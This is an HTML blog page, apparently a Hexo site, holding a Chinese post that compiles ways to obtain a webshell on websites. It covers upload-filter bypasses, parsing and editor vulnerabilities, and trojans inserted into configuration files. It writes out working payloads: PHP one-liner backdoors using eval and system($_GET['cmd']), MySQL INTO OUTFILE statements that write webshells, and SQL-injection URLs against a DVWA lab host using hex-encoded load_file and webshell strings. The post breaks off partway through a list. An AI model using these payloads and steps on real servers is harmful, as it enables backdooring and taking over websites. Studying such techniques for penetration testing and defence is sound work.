@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>脚本后门分析 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">脚本后门分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 12, 2019&nbsp;&nbsp;17:06:58</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2019/11/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/" class="leancloud-visitors view" data-flag-title="脚本后门分析">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90.png"></p>
+<h1 id="✨获取webshell主要分两大类："><a href="#✨获取webshell主要分两大类：" class="headerlink" title="✨获取webshell主要分两大类："></a>✨获取webshell主要分两大类：</h1><blockquote>
+<p>一、cms获取webshell</p>
+<p>二、非cms获取webshell</p>
+</blockquote>
+<hr>
+<h1 id="🧨什么是CMS"><a href="#🧨什么是CMS" class="headerlink" title="🧨什么是CMS"></a>🧨什么是CMS</h1><blockquote>
+<p>CMS系统指的是内容管理系统。内容管理系统（CMS）是允许用户将内容直接发布到Web的接口。将内容页面直接添加到Web的过程比从本地计算机创建和上载页面提前一步，因为它允许大量人员远程添加和共享数据。</p>
+<p>通俗来讲：CMS可以理解为CMS帮你把一个网站的程序部分的事全做完了；你要做的只是一个网站里面美工的部份</p>
+</blockquote>
+<hr>
+<h1 id="🎃一、cms获取webshell"><a href="#🎃一、cms获取webshell" class="headerlink" title="🎃一、cms获取webshell"></a>🎃一、cms获取webshell</h1><p>我们打开一个网站的时候利用wappalyzer插件可以看到网站的cms指纹信息<br>然后我们可以百度获取webshell方法，因为这些都是公开的</p>
+<p><strong>获取cms方法</strong></p>
+<blockquote>
+<p>进入后台之后可以查看<br>查看CMS系统<br>有可能直接显示<br>有可能会在最下方信息中显示<br>有可能要使用工具<br>御剑web指纹识别<br>谷歌浏览器的wappalyzer</p>
+</blockquote>
+<p><img src="/image/webshell/1.jpg"></p>
+<p><img src="/image/webshell/2.jpg"></p>
+<hr>
+<h1 id="🎇二、非cms获取webshell"><a href="#🎇二、非cms获取webshell" class="headerlink" title="🎇二、非cms获取webshell"></a>🎇二、非cms获取webshell</h1><p>当网站没有用开源的cms，或者使用自己开发的cms，我们如何获取webshell呢？首先分两种情况有管理权限（登录后台）、和无管理权限（没有登录后台）。</p>
+<h2 id="🎫有管理权限下"><a href="#🎫有管理权限下" class="headerlink" title="🎫有管理权限下"></a>🎫有管理权限下</h2><h3 id="直接上传"><a href="#直接上传" class="headerlink" title="直接上传"></a><strong>直接上传</strong></h3><p>网站对上传文件后缀格式并未过滤，直接上传WebShell即可</p>
+<p>大概思路是，已知后台管理员账号和密码，找有上传节点的地方，写一个隐蔽或变形的木马上传，上传成功后，用菜刀或蚁剑连接。</p>
+<h3 id="添加后缀类型上传"><a href="#添加后缀类型上传" class="headerlink" title="添加后缀类型上传"></a><strong>添加后缀类型上传</strong></h3><p>注：为什么要写一个隐蔽或变形的木马呢？因为如果你用的常见的木马，只要一上传就会被管理员或WAF发现（常见的木马WAF都是有收集的，所以可以写完木马之后用D盾检查一下，被WAF检测出来的危险等级是多少）</p>
+<h3 id="2-数据库备份与恢复"><a href="#2-数据库备份与恢复" class="headerlink" title="2.数据库备份与恢复"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">2.数据库备份与恢复</a></h3><p>把允许上传的格式的木马，备份或者恢复成木马格式</p>
+<p>网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如 asp、php、jsp、aspx等。然后我们可以使用工具讲一句话木马插入图片中<br>而网站具有数据库备份功能，<strong>这时我们就可以将WebShell格式先改为允许上传的文件格式，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。</strong></p>
+<p><strong>1）有些备份数据库的地方，限制了用户更改路径，那该怎么办？</strong></p>
+<blockquote>
+<p>F12打开开发者工具，修改文本框元素的value值为我们想要的路径或格式就可以完成修改</p>
+</blockquote>
+<p><strong>2）如果上传的格式被限制呢？该怎么办？</strong></p>
+<blockquote>
+<p>可以使用%00截断来绕过上传限制或使用BurpSuite 工具（%00截断、特殊名文件名绕过、文件名大小写绕过等等黑白名单绕过）之前讲过</p>
+</blockquote>
+<h3 id="3-本地js验证突破拿WebShell"><a href="#3-本地js验证突破拿WebShell" class="headerlink" title="3.本地js验证突破拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">3.本地js验证突破拿WebShell</a></h3><p>当网站设置了js来限制用户上传的文件类型时，<strong>可以通过删除js验证或者修改上传类型突破上传拿WebShell</strong>。（这种方法之前讲过，印象很深，最近有一篇绕过IWRITE写作平台防复制粘贴内个功能就是利用的这个方法）</p>
+<p>或者使用BurpSuite 或者是 Fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp或者php即可</p>
+<h3 id="4、上传其它脚本类型拿WebShell"><a href="#4、上传其它脚本类型拿WebShell" class="headerlink" title="4、上传其它脚本类型拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">4、上传其它脚本类型拿WebShell</a></h3><p>1）此类型用于一台<strong>服务器具有多个网站</strong>，a网站是asp的站，b可能是php的站，而a站中限制了上传文件类型为asp的文件，你可以尝试上传php的脚本，来拿Shell</p>
+<p>2）你也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.” 来突破文件类型限制进行上传拿WebShell</p>
+<p>这个思路还是头一次见噢，有用的思路增加了！</p>
+<h3 id="5、-00截断拿WebShell"><a href="#5、-00截断拿WebShell" class="headerlink" title="5、%00截断拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">5、%00截断拿WebShell</a></h3><p>很传统了不多说</p>
+<blockquote>
+<p>截断上传<br>%00截断<br>特殊文件名</p>
+</blockquote>
+<p>1）在上传文件的时候，你上传的文件名<strong>可能会被网站自动改成别的名字</strong>，这个时候你可以尝试抓取上传文件数据包，将文件名改为xx.asp%00.jpg进行截断上传，拿WebShell</p>
+<h3 id="6、利用解析漏洞拿WebShell"><a href="#6、利用解析漏洞拿WebShell" class="headerlink" title="6、利用解析漏洞拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">6、利用解析漏洞拿WebShell</a></h3><p>可以看中间件漏洞那个栏目 个人认为记住几个常见的就好了吧，一般都是会查一遍的，这大便宜不捡白不捡</p>
+<blockquote>
+<p>1）IIS5.x / 6.0 解析漏洞<br>2）IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞<br>3）Nginx &lt; 8.03 空字节代码执行漏洞<br>畸形解析漏洞<br>4）Apache 解析漏洞<br>（由于Apache是从右到左开始判断解析的，如果不可识别解析，就再往左判断）</p>
+</blockquote>
+<h3 id="7、利用编辑器漏洞拿WebShell"><a href="#7、利用编辑器漏洞拿WebShell" class="headerlink" title="7、利用编辑器漏洞拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">7、利用编辑器漏洞拿WebShell</a></h3><p>同中间件</p>
+<p>常见编辑器</p>
+<blockquote>
+<p>fckeditor<br>ewebeditor<br>cheditor</p>
+</blockquote>
+<h3 id="8、网站配置插马拿WebShell"><a href="#8、网站配置插马拿WebShell" class="headerlink" title="8、网站配置插马拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">8、网站配置插马拿WebShell</a></h3><p>通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该站源码，进行查看源码过滤规则，以防插马失败。</p>
+<p>PS：插马失败很有可能会导致网站被你写的一句话木马，没有闭合标签导致被网站被插废。</p>
+<p>数据库配置文件插马也是相同的</p>
+<p>往配置文件写入木马就可以了</p>
+<p>不太清楚这个插废是啥情况，没遇到过，根据不同情况，编写不同代码，需要一定能力噢</p>
+<h3 id="9、通过编辑模块拿WebShell"><a href="#9、通过编辑模块拿WebShell" class="headerlink" title="9、通过编辑模块拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">9、通过编辑模块拿WebShell</a></h3><p>1）通过对网站的<strong>模块</strong>进行编辑写入一句话，然后生成脚本文件拿WebShell</p>
+<p>2）通过将木马添加到压缩文件，把名字改为<strong>网站模板类型</strong>，上传到网站服务器，拿WebShell</p>
+<h3 id="10、修改脚本直接拿WebShell"><a href="#10、修改脚本直接拿WebShell" class="headerlink" title="10、修改脚本直接拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">10、修改脚本直接拿WebShell</a></h3><p>有的网站可以修改添加脚本文件，可以直接拿WebShell</p>
+<h3 id="11、SQL命令获取"><a href="#11、SQL命令获取" class="headerlink" title="11、SQL命令获取"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">11、SQL命令获取</a></h3><p>这个算今天印象最深刻的了</p>
+<p>可以通过phpmyadmin 登录数据库使用数据库命令来写如一句话拿WebShell</p>
+<p><strong>注：这个前提条件是需要有一定的数据库权限</strong></p>
+<p>大致步骤：</p>
+<p>创建表</p>
+<p>将一句话写入刚创建的表中</p>
+<p>查询一句话所在表到文件，成功将一句话写入文件</p>
+<p>具体操作</p>
+<p><strong>第一种</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 CREATE TABLE &#96;mysql&#96;.&#96;best&#96; (&#96;best1&#96; TEXT NOT NULL );</span><br><span class="line"></span><br><span class="line">2 INSERT INTO &#96;mysql&#96;.&#96;best&#96; (&#96;best1&#96; ) VALUES (&#39;&#39;);</span><br><span class="line"></span><br><span class="line">3 SELECT &#96;best1&#96; FROM &#96;best&#96; INTO OUTFILE &#39;d:&#x2F;wamp&#x2F;www&#x2F;best.php&#39;;</span><br><span class="line"></span><br><span class="line">4 DROP TABLE IF EXISTS &#96;best&#96;;</span><br></pre></td></tr></table></figure>
+
+<p>将一句话木马插入到mysql库best表best1字段</p>
+<p>查询这个字段导出到网站的文件中</p>
+<p>把痕迹清除</p>
+<p><strong>第二种方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 Create TABLE moon(best text NOT NULL);</span><br><span class="line"></span><br><span class="line">2 Insert INTO moon(best)VALUES(&#39;&#39;);</span><br><span class="line"></span><br><span class="line">3 selectbest from moon into outfile&#39;d:&#x2F;wamp&#x2F;www&#x2F;best2.php&#39;;</span><br><span class="line"></span><br><span class="line">4、 Drop TABLE IF EXISTS moon;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三种方法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、select&#39;&#39;INTO OUTFILE&#39;d:&#x2F;wamp&#x2F;www&#x2F;best3.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>优先推荐不但简单明了，而且避免了误删别人的数据！</strong></p>
+<p><strong>第四种方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 select&#39;\&#39;;system($_GET[\&#39;cmd\&#39;]); echo \&#39;\&#39;; </span><br><span class="line"></span><br><span class="line">2 ?&gt;&#39;INTO OUTFILE&#39;d:&#x2F;wamp&#x2F;www&#x2F;best4.php&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="12、上传特殊木马拿WebShell"><a href="#12、上传特殊木马拿WebShell" class="headerlink" title="12、上传特殊木马拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">12、上传特殊木马拿WebShell</a></h3><p>一些网站安装了WAF 安全狗、360，我们可以通过上传一些免杀马，变形木马来进行突破封杀<br>例如：<br>“%&gt;&lt;%eval request(“Skull.”)%&gt;&lt;%’”</p>
+<h3 id="13、文件包含拿WebShell"><a href="#13、文件包含拿WebShell" class="headerlink" title="13、文件包含拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">13、文件包含拿WebShell</a></h3><p><strong>先将WebShell 改为txt格式文件上传，然后上传一个脚本文件包含该txt格式文件，可绕过WAF拿WebShell</strong></p>
+<p>这种情况一般是，我们已经通过菜刀拿下了权限了，假设菜刀一句话木马可以过安全狗，但大马却怎么都没有上传成功，绕过安全狗</p>
+<p>解决<strong>发现大马上传不了，被防火墙或者安全狗拦截时，可以考虑使用包含文件</strong></p>
+<p><strong>思路</strong></p>
+<p>1）先上传一个含有包含代码（如）却没有攻击代码的文件，不会被狗拦</p>
+<p>2）再将大马改成jpg图片文件上传，也不会被狗拦</p>
+<p>3）访问第一次上传的包含函数的文件，会发现执行了木马</p>
+<p>4）这里是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中</p>
+<h1 id="非管理权限（不登录后台）"><a href="#非管理权限（不登录后台）" class="headerlink" title="非管理权限（不登录后台）"></a>非管理权限（不登录后台）</h1><h2 id="1、SQL注入漏洞"><a href="#1、SQL注入漏洞" class="headerlink" title="1、SQL注入漏洞"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">1、SQL注入漏洞</a></h2><p>有高权限 有绝对路径可以直接写</p>
+<p>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</p>
+<blockquote>
+<p>1.对于MsSQL 注入漏洞网站可以通过log 备份、差异备份拿WebShell</p>
+<p>2.对于MySQL 注入漏洞的网站可以通过into outfile 函数(写入函数)将一句话木马写入，拿WebShell。要有file_priv权限</p>
+<p>\2. 知道文件绝对路径</p>
+<p>\3. 能使用union</p>
+<p>\4. 对web目录有读权限</p>
+<p>注：若过滤了单引号，则可以将函数中的字符进行hex编码还有一个是into file 函数（读取函数）# into outfile 函数类似</p>
+</blockquote>
+<p>之后3.利用phpmyadmin 将木马导出，拿WebShell</p>
+<p>4.利用连接外连的数据库拿WebShell</p>
+<h2 id="2、修改网站上传类型配置来拿WebShell"><a href="#2、修改网站上传类型配置来拿WebShell" class="headerlink" title="2、修改网站上传类型配置来拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">2、修改网站上传类型配置来拿WebShell</a></h2><p>某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p>
+<h2 id="3、xss和sql注入联合利用"><a href="#3、xss和sql注入联合利用" class="headerlink" title="3、xss和sql注入联合利用"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">3、xss和sql注入联合利用</a></h2><p>有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<?php @eval($_POST['CE']);?>之后再用数据库注入，查询到文件into file成功插入一句话木马</p>
+<h2 id="4、IIS写权限拿WebShell"><a href="#4、IIS写权限拿WebShell" class="headerlink" title="4、IIS写权限拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">4、IIS写权限拿WebShell</a></h2><p>有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，在这里就不说了，只是提一下。而且已经很少见了，有专门的利用工具（桂林老兵），原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p>
+<h2 id="5、远程命令执行拿WebShell"><a href="#5、远程命令执行拿WebShell" class="headerlink" title="5、远程命令执行拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">5、远程命令执行拿WebShell</a></h2><p>在有php代码执行漏洞</p>
+<p>例如一些框架漏洞的时候</p>
+<p>可以通过执行一些系统命令进行拿WebShell</p>
+<p>执行命令行命令“写入内容到文件”echo ?php “@eval($_POST[‘CE’]);?&gt;” &gt; x.php 会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p>
+<h2 id="6、头像上传拿WebShell"><a href="#6、头像上传拿WebShell" class="headerlink" title="6、头像上传拿WebShell"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">6、头像上传拿WebShell</a></h2><p>大概思路：</p>
+<p>1、将大马放在文件夹中</p>
+<p>2、将文件夹压缩成压缩文件（zip）</p>
+<p>3、正常上传一个头像并且抓包</p>
+<p>4、将数据包中图片头像的内容部分删掉</p>
+<p>5、重新写入文件内容，将压缩文件写入到原本图片的位置</p>
+<p>上传</p>
+<p>之后返回包中会告诉我们绝对路径</p>
+<h2 id="其他拿webshell方法"><a href="#其他拿webshell方法" class="headerlink" title="其他拿webshell方法"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/writer">其他拿webshell方法</a></h2><p>1、PhpMyadmin获取Webshell</p>
+<p>2、Tomcat获取Webshell</p>
+<p>3、Weblogic获取Webshell</p>
+<p>4、JBoss获取Webshell</p>
+<p>5.更新页面拿webshell</p>
+<p>在网站模板中的404页面中插入一句话木马，之后找到这个页面的绝对路径，访问之即可拿Shell</p>
+<p>6.上传插件拿webshell</p>
+<p>将木马放入zip压缩文件中，最好是网站插件的压缩文件，之后再后台安装插件，选中含有木马的压缩文件，会自动将插件连通木马安装在网站目录下，接下来我们只需要寻找到木马的绝对路径即可</p>
+<p>今天一天查了好多资料，这篇文章借鉴了以下的文章，有的年代久远有的刚更新不久，与其说借鉴，倒不如说是对这些文章的一个总结抄录，在这里由衷感谢各位安全大佬的无私分享！</p>
+<p>获取webshell的一些总结 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4d37c160d009">https://www.jianshu.com/p/4d37c160d009</a></p>
+<p>拿WebShell 方法总结 原文链接：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://blog.csdn.net/God_XiangYu/article/details/99644596">https://blog.csdn.net/God_XiangYu/article/details/99644596</a></p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://gstarwd.iteye.com/blog/542376">http://gstarwd.iteye.com/blog/542376</a> dedecms获取Webshell总结</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://www.2cto.com/Article/201209/156909.html">http://www.2cto.com/Article/201209/156909.html</a> 浅谈MySQL导出一句话木马拿WebShell的方法</p>
+<h1 id="对服务器文件进行读写操作获取webshell"><a href="#对服务器文件进行读写操作获取webshell" class="headerlink" title="对服务器文件进行读写操作获取webshell"></a>对服务器文件进行读写操作获取webshell</h1><h2 id="使用into-outfile需要有以下条件："><a href="#使用into-outfile需要有以下条件：" class="headerlink" title="使用into outfile需要有以下条件："></a>使用into outfile需要有以下条件：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、需要知道远程目录</span><br><span class="line">2、需要远程目录有写权限</span><br><span class="line">3、需要数据库开启secure_file_priv进行读写操作</span><br></pre></td></tr></table></figure>
+
+<p>数据库开启secure_file_priv<br>into outfile 可以将select的结果写入到指定目录的txt中，但需要数据库开启secure_file_priv，怎么开启secure_file_priv。<br>在mysql安装目录的my.ini文件中的[mysqld]添加secure_file_priv = ‘ ‘；然后以管理员身份运行cmd，进入mysql/bin停止mysql服务net stop mysql，重新启动mysql服务net start mysql，登入mysql mysql -u root -p enter password: password，执行命令show variables like ‘%secure%’;查看secure_file_priv的值（这里已经将secure_file_priv的值设为空，但正常显示为NULL和文件路径），显示以下界面说明可以对服务器进行读写操作。</p>
+<p><img src="/image/webshell/3.jpg"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file</a>(‘c</p>
+<p>如果出现以下情况:<br>Query Errot:SELECT CID,TITLE FROM CMS_CONTENTINDEX WHERE TID=25950\’AND 1=2 UNION SELECT LOAD_FILE(’C:\BOOT.INI\’),2<br>显然，在“php.ini”配置文件中magic_quotes_gpc为on或在接受参数的时候用了addslashes()涵数，单引号就会被自动转义成’，因此函数未能正确执行功能.要绕开此过滤，可将c:\boot.ini转换成十六进制，转换后为:0x633A5C5C626F6F742E696E69.再提交如下链接。<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%2527%2520union%2520select%25201,load_file(0x633A5C5C626F6F742E696E69)+--+&Submit=Submit">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(0x633A5C5C626F6F742E696E69)+–+&amp;Submit=Submit</a><br>或<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1</a> and 1=2 union select 1,load_file(0x633A5C5C626F6F742E696E69)+–+&amp;Submit=Submit</p>
+<p>如果想对服务器进行写操作，直接用下用这条语句进行操作：<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%2527%2520union%2520select%2520%27568311803%27,2">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%20’568311803’,2</a> into outfile ‘c:/muma.txt’+–+&amp;Submit=Submit<br>写个一句话试试：<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%2527%2520union%2520select%25200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2</a> into outfile ‘c:/muma.txt’+–+&amp;Submit=Submit<br>为什么要把一句话木马转化为十六进制，因为一句话木马里面也有单引号，再用单引号引起来会容易造成混淆。所以得出结论：如果用编码就不要用单引号，用单引号就不要用编码。</p>
+<p><img src="/image/webshell/4.jpg"></p>
+<h2 id="获取web路径方法"><a href="#获取web路径方法" class="headerlink" title="获取web路径方法"></a>获取web路径方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+--+&amp;Submit&#x3D;Submit  &#x2F;&#x2F;路径记得转化为十六进制</span><br></pre></td></tr></table></figure>
+
+<p>常见WINDOWS下配置文件:</p>
